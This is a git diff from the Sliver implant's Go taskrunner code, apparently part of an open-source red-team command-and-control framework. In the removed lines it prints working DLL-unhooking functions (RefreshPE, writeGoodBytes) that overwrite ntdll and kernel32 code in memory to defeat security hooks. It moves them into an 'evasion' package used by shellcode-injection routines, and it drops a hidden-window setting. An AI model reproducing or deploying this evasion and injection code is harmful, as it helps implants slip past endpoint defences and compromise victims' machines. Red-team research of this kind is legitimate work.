@@ -22,10 +22,8 @@ package taskrunner
 
 import (
 	"bytes"
-	"debug/pe"
 	"fmt"
 	"io"
-	"io/ioutil"
 
 	// {{if .Debug}}
 	"log"
@@ -38,6 +36,7 @@ import (
 	"golang.org/x/sys/windows"
 	"github.com/bishopfox/sliver/sliver/version"
 	"github.com/bishopfox/sliver/sliver/syscalls"
+	"github.com/bishopfox/sliver/sliver/evasion"
 )
 
 const (
@@ -63,87 +62,6 @@ func sysAlloc(size int, rwxPages bool) (uintptr, error) {
 		return 0, err
 	}
 	return addr, nil
-}
-
-func ptr(val interface{}) uintptr {
-	switch val.(type) {
-	case string:
-		return uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(val.(string))))
-	case int:
-		return uintptr(val.(int))
-	default:
-		return uintptr(0)
-	}
-}
-
-func RefreshPE(name string) error {
-	//{{if .Debug}}
-	log.Printf("Reloading %s...\n", name)
-	//{{end}}
-	df, e := ioutil.ReadFile(name)
-	if e != nil {
-		return e
-	}
-	f, e := pe.Open(name)
-	if e != nil {
-		return e
-	}
-
-	x := f.Section(".text")
-	ddf := df[x.Offset:x.Size]
-	return writeGoodBytes(ddf, name, x.VirtualAddress, x.Name, x.VirtualSize)
-}
-
-func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, vsize uint32) error {
-	t, e := windows.LoadDLL(pn)
-	if e != nil {
-		return e
-	}
-	h := t.Handle
-	dllBase := uintptr(h)
-
-	dllOffset := uint(dllBase) + uint(virtualoffset)
-
-	var old int
-	kernel32 := windows.NewLazyDLL("kernel32.dll")
-
-	virtprot := kernel32.NewProc("VirtualProtect")
-	r, _, e := virtprot.Call(
-		uintptr(dllOffset),
-		uintptr(len(b)),
-		uintptr(0x40),
-		uintptr(unsafe.Pointer(&old)),
-	)
-	if int(r) == 0 {
-		return e
-	}
-	//{{if .Debug}}
-	log.Println("Made memory map RWX")
-	//{{end}}
-
-	for i := 0; i < len(b); i++ {
-		loc := uintptr(dllOffset + uint(i))
-		mem := (*[1]byte)(unsafe.Pointer(loc))
-		(*mem)[0] = b[i]
-	}
-
-	//{{if .Debug}}
-	log.Println("DLL overwritten")
-	//{{end}}
-
-	r, _, e = virtprot.Call(
-		uintptr(dllOffset),
-		uintptr(len(b)),
-		uintptr(old),
-		uintptr(unsafe.Pointer(&old)),
-	)
-	if int(r) == 0 {
-		return e
-	}
-	//{{if .Debug}}
-	log.Println("Restored memory map permissions")
-	//{{end}}
-	return nil
 }
 
 // injectTask - Injects shellcode into a process handle
@@ -221,17 +139,17 @@ func RemoteTask(processID int, data []byte, rwxPages bool) error {
 	// Somehow this fucks up everything on Windows 8.1
 	// so we're skipping the RefreshPE calls.
 	if version.GetVersion() != "6.3 build 9600" {
-		err = RefreshPE(ntdllPath)
+		err = evasion.RefreshPE(ntdllPath)
 		if err != nil {
 			//{{if .Debug}}
-			log.Printf("RefreshPE on ntdll failed: %v\n", err)
+			log.Printf("evasion.RefreshPE on ntdll failed: %v\n", err)
 			//{{end}}
 			return err
 		}
-		err = RefreshPE(kernel32dllPath)
+		err = evasion.RefreshPE(kernel32dllPath)
 		if err != nil {
 			//{{if .Debug}}
-			log.Printf("RefreshPE on kernel32 failed: %v\n", err)
+			log.Printf("evasion.RefreshPE on kernel32 failed: %v\n", err)
 			//{{end}}
 			return err
 		}
@@ -251,19 +169,19 @@ func LocalTask(data []byte, rwxPages bool) error {
 	var err error
 	// Hotfix for #114
 	// Somehow this fucks up everything on Windows 8.1
-	// so we're skipping the RefreshPE calls.
+	// so we're skipping the evasion.RefreshPE calls.
 	if version.GetVersion() != "6.3 build 9600" {
-		err = RefreshPE(ntdllPath)
+		err = evasion.RefreshPE(ntdllPath)
 		if err != nil {
 			//{{if .Debug}}
-			log.Printf("RefreshPE on ntdll failed: %v\n", err)
+			log.Printf("evasion.RefreshPE on ntdll failed: %v\n", err)
 			//{{end}}
 			return err
 		}
-		err = RefreshPE(kernel32dllPath)
+		err = evasion.RefreshPE(kernel32dllPath)
 		if err != nil {
 			//{{if .Debug}}
-			log.Printf("RefreshPE on kernel32 failed: %v\n", err)
+			log.Printf("evasion.RefreshPE on kernel32 failed: %v\n", err)
 			//{{end}}
 			return err
 		}
@@ -293,11 +211,11 @@ func LocalTask(data []byte, rwxPages bool) error {
 }
 
 func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeout int32) (string, error) {
-	err := RefreshPE(ntdllPath)
+	err := evasion.RefreshPE(ntdllPath)
 	if err != nil {
 		return "", err
 	}
-	err = RefreshPE(kernel32dllPath)
+	err = evasion.RefreshPE(kernel32dllPath)
 	if err != nil {
 		return "", err
 	}
@@ -427,19 +345,19 @@ func SpawnDll(procName string, data []byte, offset uint32, args string) (string,
 	var err error
 	// Hotfix for #114
 	// Somehow this fucks up everything on Windows 8.1
-	// so we're skipping the RefreshPE calls.
+	// so we're skipping the evasion.RefreshPE calls.
 	if version.GetVersion() != "6.3 build 9600" {
-		err = RefreshPE(ntdllPath)
+		err = evasion.RefreshPE(ntdllPath)
 		if err != nil {
 			//{{if .Debug}}
-			log.Printf("RefreshPE on ntdll failed: %v\n", err)
+			log.Printf("evasion.RefreshPE on ntdll failed: %v\n", err)
 			//{{end}}
 			return "", err
 		}
-		err = RefreshPE(kernel32dllPath)
+		err = evasion.RefreshPE(kernel32dllPath)
 		if err != nil {
 			//{{if .Debug}}
-			log.Printf("RefreshPE on kernel32 failed: %v\n", err)
+			log.Printf("evasion.RefreshPE on kernel32 failed: %v\n", err)
 			//{{end}}
 			return "", err
 		}
@@ -453,8 +371,6 @@ func SpawnDll(procName string, data []byte, offset uint32, args string) (string,
 	cmd.SysProcAttr = &windows.SysProcAttr{
 		//{{if .Debug}}
 		HideWindow: false,
-		//{{else}}
-		HideWindow: true,
 		//{{end}}
 	}
 	err = cmd.Start()
